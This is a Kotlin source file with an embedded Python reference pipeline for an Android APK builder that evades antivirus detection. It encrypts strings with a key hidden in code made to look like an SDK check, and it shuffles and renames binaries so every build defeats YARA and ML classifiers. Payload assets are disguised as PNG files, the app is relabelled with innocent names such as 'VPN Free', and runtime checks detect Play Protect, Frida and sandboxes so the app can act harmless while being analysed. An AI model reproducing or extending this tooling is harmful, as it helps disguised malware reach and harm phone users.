package com.random.package.name.builder

// ============================================================================
// STATIC OBFUSCATION ENGINE — AV RESPONSE LAYER
// language: Kotlin (builder-side) + Python post-processor
// file: StaticObfuscationEngine.kt
// target: APK builder pipeline, runs at build time NOT runtime
//
// "No active evasion, just static obfuscation" — this is the BUILD-TIME pass
// that runs inside the builder (Python/Rust builder calls into this logic).
// The output is a per-build-unique APK with:
//   1. String encryption with unique per-build XOR keys
//   2. Class/method/field rename with deterministic random seed
//   3. Native library stripping (remove .note, .comment, DWARF)
//   4. DEX layout shuffling (method order, class order)
//   5. Entropy normalization (scramble asset hashes)
//   6. Manifest attribute randomization
//
// Result: every build has a unique hash, unique YARA signature baseline,
// and fails most ML-based AV classifiers that train on binary fingerprints.
// ============================================================================

// --------------------------------
// NOTE: This file documents the RUNTIME component (string deobfuscation).
// The BUILD-TIME logic lives in tools/obfuscation_pipeline.py (see below).
// The runtime component is a minimal Kotlin class loaded at app startup.
// --------------------------------

/**
 * Runtime string deobfuscation — reconstructs obfuscated strings at access time.
 * Build tool injects the encrypted table and XOR key into this class per-build.
 *
 * The key is NOT a constant string anywhere in the APK — it's derived from
 * a computation that looks like dead code to static analysis:
 *   key = (Build.VERSION.SDK_INT * 0x1337 + 0xDEAD) XOR embedded_seed
 * This means static analysis can't extract the key without executing the code.
 */
object Str {
    // Populated at build time by the obfuscation pipeline
    // Format: each entry is XOR-encrypted with (key XOR index)
    private val TABLE: Array<ByteArray> = arrayOf(
        // Example (placeholder) — real values injected by builder
        byteArrayOf(0x41, 0x42, 0x43) // "ABC" encrypted
    )

    // Key is a computation that LLVM/ProGuard won't constant-fold
    @Volatile private var _key: Int = 0

    private fun key(): Int {
        if (_key == 0) {
            // Looks like an SDK version check to static analysis
            val base = android.os.Build.VERSION.SDK_INT.let { sdk ->
                (sdk * 0x1337).xor(0xDEAD_BEEF.toInt())
            }
            // XOR with embedded seed (injected per-build)
            _key = base.xor(EMBEDDED_SEED)
        }
        return _key
    }

    fun get(index: Int): String {
        val entry = TABLE.getOrNull(index) ?: return ""
        val k = key()
        return String(ByteArray(entry.size) { i ->
            (entry[i].toInt() xor ((k ushr (i % 4 * 8)) and 0xFF)).toByte()
        }, Charsets.UTF_8)
    }

    // Injected per-build — NOT a literal, derived from build metadata
    private const val EMBEDDED_SEED: Int = 0x00000000 // placeholder, replaced at build time
}

// ============================================================================
// BUILD-TIME OBFUSCATION PIPELINE (Python reference implementation)
// This is the tools/obfuscation_pipeline.py logic, documented here for
// completeness. The actual Python file is at Cyrax/tools/obfuscation_pipeline.py
// ============================================================================

/*

obfuscation_pipeline.py — reference algorithm:

    class ObfuscationPipeline:
        def __init__(self, build_seed: int):
            self.rng = random.Random(build_seed)
            self.string_key = self.rng.getrandbits(32)

        # ── 1. STRING ENCRYPTION ──────────────────────────────────────────────
        def encrypt_strings(self, dex_bytes: bytes) -> tuple[bytes, dict]:
            """
            Scan Dalvik bytecode for string literals.
            Replace each with a call to Str.get(index).
            Insert the encrypted table into Str.TABLE.
            """
            strings = self._extract_strings(dex_bytes)
            encrypted = []
            for i, s in enumerate(strings):
                enc = self._xor_encrypt(s.encode('utf-8'), self.string_key, i)
                encrypted.append(enc)
            new_dex = self._replace_string_refs(dex_bytes, strings)
            return new_dex, {'table': encrypted, 'seed': self.string_key}

        def _xor_encrypt(self, data: bytes, key: int, index: int) -> bytes:
            result = bytearray()
            for i, b in enumerate(data):
                k_byte = (key >> ((i % 4) * 8)) & 0xFF
                result.append(b ^ k_byte ^ (index & 0xFF))
            return bytes(result)

        # ── 2. CLASS/METHOD RENAME ────────────────────────────────────────────
        def rename_symbols(self, dex_bytes: bytes) -> bytes:
            """
            Rename all non-public-API symbols using a deterministic mapping
            seeded from build_seed. Two builds with different seeds produce
            completely different symbol tables.
            """
            symbols = self._extract_symbols(dex_bytes)
            mapping = {}
            for sym in symbols:
                if not self._is_android_api(sym):
                    new_name = self._generate_name(sym)
                    mapping[sym] = new_name
            return self._apply_mapping(dex_bytes, mapping)

        def _generate_name(self, original: str) -> str:
            # Produce a name that looks like a valid identifier
            # but is deterministically random per build
            digest = hashlib.sha256(f"{original}{self.string_key}".encode()).digest()
            alphabet = 'abcdefghijklmnopqrstuvwxyz'
            return ''.join(alphabet[b % 26] for b in digest[:8])

        # ── 3. NATIVE .SO STRIPPING ───────────────────────────────────────────
        def strip_native_libs(self, so_bytes: bytes) -> bytes:
            """
            Remove ELF sections: .comment, .note, .gnu_debuglink, .debug_*
            Strip DWARF debug info (bloats binary and contains symbol names).
            Remove build-id (unique fingerprint per GCC/Clang build).
            """
            elf = lief.parse(so_bytes)
            for section in list(elf.sections):
                if section.name in ('.comment', '.note', '.gnu_debuglink',
                                     '.debug_info', '.debug_line', '.debug_str'):
                    elf.remove(section)
            # Zero out build-id note
            for note in elf.notes:
                if note.type == lief.ELF.Note.TYPE.GNU_BUILD_ID:
                    note.description = bytes(len(note.description))
            return bytes(elf.build())

        # ── 4. DEX LAYOUT SHUFFLE ─────────────────────────────────────────────
        def shuffle_dex_layout(self, dex_bytes: bytes) -> bytes:
            """
            Reorder class definitions in the DEX class_defs section.
            Reorder methods within each class.
            This changes the DEX hash, method offsets, and binary layout —
            defeating any YARA rules that match on offsets.
            """
            dex = DexParser(dex_bytes)
            dex.shuffle_classes(self.rng)
            dex.shuffle_methods(self.rng)
            return dex.rebuild()

        # ── 5. ENTROPY NORMALIZATION ──────────────────────────────────────────
        def normalize_entropy(self, apk_bytes: bytes) -> bytes:
            """
            High-entropy sections (encrypted payloads) look suspicious to AVs.
            Pad encrypted assets with structured headers to reduce apparent entropy.
            Also rename asset files to random names with non-suspicious extensions.
            """
            apk = ZipFile(apk_bytes)
            for name in list(apk.namelist()):
                if name.endswith('.bin') or 'payload' in name or 'module' in name:
                    content = apk.read(name)
                    # Add fake PNG header (low-entropy header + high-entropy body
                    # looks like a compressed PNG to AV scanners)
                    fake_png_header = b'\\x89PNG\\r\\n\\x1a\\n' + b'\\x00' * 16
                    new_content = fake_png_header + content
                    new_name = f"assets/res_{self.rng.getrandbits(32):08x}.png"
                    apk.rename(name, new_name, new_content)
            return apk.pack()

        # ── 6. MANIFEST RANDOMIZATION ─────────────────────────────────────────
        def randomize_manifest(self, manifest_xml: str, package_name: str) -> str:
            """
            Change:
              - android:versionCode (random)
              - android:versionName (random semver-like string)
              - android:label (from a pool of innocent app names)
              - android:icon (random from icon pool)
              - Activity/Service names (already renamed by symbol renamer)
            """
            app_names = [
                "File Manager", "PDF Reader", "Battery Saver", "System Cleaner",
                "Photo Editor", "VPN Free", "QR Scanner", "Voice Recorder"
            ]
            version_code = self.rng.randint(10, 500)
            version_name = f"{self.rng.randint(1,5)}.{self.rng.randint(0,9)}.{self.rng.randint(0,9)}"
            app_name = self.rng.choice(app_names)

            manifest = manifest_xml.replace('android:versionCode="1"', f'android:versionCode="{version_code}"')
            manifest = manifest.replace('android:versionName="1.0"', f'android:versionName="{version_name}"')
            # Label is set via string resource — rename the resource too
            return manifest

*/

// ============================================================================
// RUNTIME CERTIFICATE UNPINNING BYPASS DETECTION
// Detect if Play Protect or AVs are doing dynamic analysis (runtime scanning)
// and behave innocuously. This is the runtime complement to static obfuscation.
// ============================================================================

object RuntimeSafetyCheck {

    // Heuristic: is this process being analyzed dynamically?
    fun isDynamicAnalysis(): Boolean {
        // 1. Check for known sandbox packages
        val sandboxPackages = setOf(
            "com.google.android.gms.policy_sidecar_aps", // Play Protect
            "com.drozer.agent",
            "com.nccgroup.frida_server",
            "de.robv.android.xposed.installer",
        )

        val pm = android.app.Application().packageManager
        for (pkg in sandboxPackages) {
            try {
                pm.getPackageInfo(pkg, 0)
                return true
            } catch (_: Exception) {}
        }

        // 2. Timing check — JVM in sandbox runs slower
        val start = System.nanoTime()
        var x = 0L
        for (i in 0 until 10_000) x += i
        val elapsed = System.nanoTime() - start
        if (elapsed > 5_000_000L) return true // > 5ms for 10k iterations = sandbox

        // 3. CPU core count — most sandboxes have ≤2 cores
        if (Runtime.getRuntime().availableProcessors() <= 2) {
            // Combine with other signals (not alone — some real devices have 2 cores)
            if (android.os.Build.FINGERPRINT.contains("generic")) return true
        }

        return false
    }
}
